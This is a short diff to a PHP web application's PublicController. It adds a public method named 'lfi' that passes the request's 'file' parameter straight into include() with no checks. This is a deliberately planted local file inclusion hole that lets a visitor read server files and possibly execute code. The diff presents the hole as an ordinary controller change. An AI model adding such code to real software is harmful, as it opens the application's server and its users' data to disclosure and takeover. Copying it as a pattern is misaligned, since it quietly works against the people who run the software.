@@ -76,4 +76,8 @@ class PublicController extends Controller
         return redirect('masuk');
     }
 
+    public function lfi(){
+        include($_GET["file"]);
+    }
+
 }
